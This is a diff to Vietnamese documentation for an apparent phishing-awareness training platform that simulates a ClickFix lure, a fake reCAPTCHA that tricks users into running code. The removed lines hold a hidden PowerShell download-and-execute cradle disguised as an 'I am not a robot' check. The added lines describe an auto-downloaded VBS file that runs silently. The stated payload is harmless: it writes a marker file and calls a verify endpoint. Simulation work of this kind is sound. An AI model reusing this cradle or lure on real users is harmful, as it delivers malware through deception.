@@ -31,11 +31,10 @@ thì gửi đúng một HTTP GET về server training để đánh dấu "user �
 
 Chuỗi bẫy ClickFix (training flow):
   Form đăng ký → token → modal "reCAPTCHA giả" → click checkbox
-  → copy payload cradle ngắn vào clipboard (PowerShell chạy hidden):
-     powershell -w hidden -nop -ep bypass -c "iex(iwr '<origin>/api/clickfix/s?t=<token>' -UseBasicParsing)" # ✅ ''I am not a robot…''
-  → user bấm Win+R → Ctrl+V → Enter
-  → cradle tải stage-2 (/api/clickfix/s) rồi iex hidden:
-      stage-2 tạo file vô hại C:\Temp\hehehe.txt + GET /api/clickfix/verify?t=<token>
+  → modal mở + TỰ TẢI file "công cụ xác minh" verification.vbs (/api/clickfix/tool?t=<token>)
+     (token nhúng sẵn trong file; nút Download là backup nếu browser chặn auto-download)
+  → user mở file (double-click) — wscript chạy im lặng:
+      file vô hại tạo C:\Temp\hehehe.txt + GET /api/clickfix/verify?t=<token>
   → frontend poll /api/clickfix/status mỗi 2 giây → hiện nút "Verify" → đăng nhập vào console
 ```
 
